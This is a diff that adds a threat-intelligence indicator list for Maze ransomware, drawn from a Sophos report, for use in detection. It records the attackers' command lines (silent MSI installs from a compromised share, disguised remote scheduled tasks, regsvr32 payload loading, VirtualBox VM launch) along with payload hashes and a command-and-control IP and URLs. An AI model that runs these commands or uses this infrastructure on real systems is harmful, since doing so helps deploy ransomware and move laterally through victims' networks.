@@ -1,0 +1,164 @@
+- data: Indicators for Maze ransomware
+  ioc_type: description
+  note: https://news.sophos.com/en-us/2020/09/17/maze-attackers-adopt-ragnar-locker-virtual-machine-technique
+- data: cmd.exe /c c:\programdata\3.bat
+  ioc_type: command_line
+  note: ''
+- data: cmd.exe /C mklink /j "C:\SDRSMLINK\Documents and Settings" "C:\Documents and
+    Settings"
+  ioc_type: command_line
+  note: ''
+- data: cmd.exe /C mklink /j "C:\SDRSMLINK\Program files (x86)" "C:\Program files
+    (x86)"
+  ioc_type: command_line
+  note: ''
+- data: cmd.exe /C mklink /j "C:\SDRSMLINK\Program files" "C:\Program files"
+  ioc_type: command_line
+  note: ''
+- data: cmd.exe /C mklink /j "C:\SDRSMLINK\System Volume Information" "C:\System Volume
+    Information"
+  ioc_type: command_line
+  note: ''
+- data: cmd.exe /C mklink /j C:\SDRSMLINK\$Recycle.Bin C:\$Recycle.Bin
+  ioc_type: command_line
+  note: ''
+- data: cmd.exe /C mklink /j C:\SDRSMLINK\Config.Msi C:\Config.Msi
+  ioc_type: command_line
+  note: ''
+- data: cmd.exe /C mklink /j C:\SDRSMLINK\ProgramData C:\ProgramData
+  ioc_type: command_line
+  note: ''
+- data: cmd.exe /C mklink /j C:\SDRSMLINK\Recovery C:\Recovery
+  ioc_type: command_line
+  note: ''
+- data: cmd.exe /C mklink /j C:\SDRSMLINK\Restore C:\Restore
+  ioc_type: command_line
+  note: ''
+- data: cmd.exe /C mklink /j C:\SDRSMLINK\StorageReports C:\StorageReports
+  ioc_type: command_line
+  note: ''
+- data: cmd.exe /C mklink /j C:\SDRSMLINK\TEMP C:\TEMP
+  ioc_type: command_line
+  note: ''
+- data: cmd.exe /C mklink /j C:\SDRSMLINK\Users C:\Users
+  ioc_type: command_line
+  note: ''
+- data: cmd.exe /C mklink C:\SDRSMLINK\DECRYPT-fileS.txt C:\DECRYPT-fileS.txt
+  ioc_type: command_line
+  note: ''
+- data: enc.exe --logging
+  ioc_type: command_line_parameter
+  note: ''
+- data: enc6.exe --logging
+  ioc_type: command_line_parameter
+  note: ''
+- data: regsvr32.exe /i c:\programdata\network.dll
+  ioc_type: command_line_parameter
+  note: ''
+- data: '[cmd /c msiexec /qn /i \\[compromised-server-name]\frs\pikujuwusewa.msi]'
+  ioc_type: command_line_parameter
+  note: ''
+- data: C:\Program files (x86)\pikujuwusewa\app64\VBoxHeadless.exe --startvm micro
+    -v off
+  ioc_type: command_line_parameter
+  note: ''
+- data: C:\Program files (x86)\pikujuwusewa\app64\VBoxSVC.exe /reregserver
+  ioc_type: command_line_parameter
+  note: ''
+- data: C:\Program files (x86)\pikujuwusewa\app64\VBoxSVC.exe /unregserver
+  ioc_type: command_line_parameter
+  note: ''
+- data: C:\Program files (x86)\pikujuwusewa\app64\VBoxSVC.exe -Embedding
+  ioc_type: command_line_parameter
+  note: ''
+- data: cmd /c SCHTASKS /s [ip-address-of-target] /RU "SYSTEM" /create /tn "Google
+    Chrome Security Update" /tr "c:\programdata\license.exe" /sc ONCE /sd 01/01/1910
+    /st 00:00 /f
+  ioc_type: command_line_parameter
+  note: ''
+- data: cmd /c SCHTASKS /s [ip-address-of-target] /run /TN "Google Chrome Security
+    Update"
+  ioc_type: command_line_parameter
+  note: ''
+- data: cmd.exe /C "C:\Program files (x86)\pikujuwusewa\app64\VBoxSVC.exe" /reregserver
+  ioc_type: command_line_parameter
+  note: ''
+- data: cmd.exe /C "C:\Program files (x86)\pikujuwusewa\app64\VBoxSVC.exe" /unregserver
+  ioc_type: command_line_parameter
+  note: ''
+- data: cmd.exe /C "C:\Program files (x86)\pikujuwusewa\starter.bat"
+  ioc_type: command_line_parameter
+  note: ''
+- data: cmd.exe /C regsvr32 /S /U "C:\Program files (x86)\pikujuwusewa\app64\VBoxC.dll"
+  ioc_type: command_line_parameter
+  note: ''
+- data: regsvr32 /S "C:\Program files (x86)\pikujuwusewa\app64\VBoxC.dll"
+  ioc_type: command_line_parameter
+  note: ''
+- data: regsvr32 /S /U "C:\Program files (x86)\pikujuwusewa\app64\VBoxC.dll"
+  ioc_type: command_line_parameter
+  note: ''
+- data: regsvr32.exe /i c:\programdata\network.dll --nomutex
+  ioc_type: command_line_parameter
+  note: ''
+- data: (hash not available)
+  ioc_type: file_path_name
+  note: C:\programdata\license.exe
+- data: 0df95fe05e4c6dbe7fd1cf4221ab3bf053761027cd496ac0a84eb435080245e9
+  ioc_type: file_path_name
+  note: vrun.exe
+- data: 52b13207e6464a7fd57b02c3c4525339e91e60348e5a9e5d03f2b6faf117c82b
+  ioc_type: file_path_name
+  note: payload (.dll)
+- data: 591d08c34b2d6945b39798a836f2cbaa9af7e8573df9de82038cfe0bef728255
+  ioc_type: file_path_name
+  note: C:\ProgramData\enc6.exe
+- data: 5b579e53f60a2f5dcf1d29fd23a86d6efe3aba784f95165e1618db1ee1ace425
+  ioc_type: file_path_name
+  note: C:\ProgramData\msinfo64.exe (meterpreter)
+- data: 6279e93c1ad63991b95dfd3775581835ec76f8b19a3c2947365d28736dd5741a
+  ioc_type: file_path_name
+  note: micro.vdi
+- data: 6e742521a05a30c256bb5aa3a83e317132230c84e205aef9b200dbf1d1d52ac4
+  ioc_type: file_path_name
+  note: C:\ProgramData\enc.exe
+- data: 7ee403ca56a0bd609ff8eb9f9c893eb06456be283e0c3a0feeda15fd32173742
+  ioc_type: file_path_name
+  note: C:\programdata\network.dll
+- data: dfb416add0a8d67800832863ab932cf3991424846a21de5dfff9de38e3df3c4f
+  ioc_type: file_path_name
+  note: preload.bat
+- data: f56775b2bc86a692982b0013e1d3ed5445db708ebbb0e70001b9e6df1dfbd193
+  ioc_type: file_path_name
+  note: C:\ProgramData\msinfo32.exe (Cobalt Strike)
+- data: f9eb9b611e49910e4fabd56379fc6142ac51f2b7d1e0c82b9ca7f37ee5df43ac
+  ioc_type: file_path_name
+  note: pikujuwusewa.msi
+- data: 94.232.40.167:9338
+  ioc_type: ip_port
+  note: Russia C2 - hxxps://dev.metasploit.com
+- data: HKCU\SOFTWARE\LmuSMJdqtVATql /v uDyiciWrann /t REG_DWORD /d 2365
+  ioc_type: registry_path_key_value
+  note: ''
+- data: Windows Update Security Patches
+  ioc_type: scheduled_task_path
+  note: C:\programdata\enc.exe / C:\programdata\enc6.exe
+- data: Windows Update Security Patches 5
+  ioc_type: scheduled_task_path
+  note: C:\programdata\enc.exe / C:\programdata\enc6.exe
+- data: Windows Update Security
+  ioc_type: scheduled_task_path
+  note: regsvr32.exe /i c:\programdata\network.dll
+- data: Google Chrome Security Update
+  ioc_type: scheduled_task_path
+  note: C:\programdata\license.exe
+- data: Windows Update Security Patches 2
+  ioc_type: scheduled_task_path
+  note: C:\programdata\enc.exe / C:\programdata\enc6.exe
+- data: 94.232.40.167:9338/dot.gif
+  ioc_type: url
+  note: ''
+- data: 94.232.40.167:9338/visit.js
+  ioc_type: url
+  note: ''
+
